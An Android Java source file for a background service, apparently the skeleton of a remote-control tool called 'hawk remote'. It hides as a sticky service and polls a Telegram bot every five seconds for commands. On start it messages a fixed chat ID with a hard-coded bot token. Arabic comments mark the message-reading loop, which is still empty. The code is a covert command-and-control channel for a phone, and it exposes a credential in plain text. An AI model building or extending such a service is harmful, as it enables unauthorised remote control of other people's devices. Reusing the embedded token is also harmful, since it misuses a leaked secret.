package com.hawk.remote;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class CoreService extends Service {
    String BOT_TOKEN = "8971058785:AAEwdZMtTkJuFKBr76MGnuDnQD4tYKQroZ8";
    String CHAT_ID = "7205198120";
    boolean running = true;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            public void run() {
                while (running) {
                    try {
                        // هنا بيقرا الرسايل من تيليجرام
                        java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=-1");
                        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
                        String line;
                        while ((line = reader.readLine()) != null) {
                            // مجرد رد بسيط للتأكيد
                        }
                        Thread.sleep(5000);
                    } catch (Exception e) {}
                }
            }
        }).start();
        
        sendMsg("تم تشغيل البرنامج بنجاح! أرسل /help");
        return START_STICKY;
    }

    void sendMsg(String text) {
        try {
            java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text);
            url.openConnection().getInputStream();
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
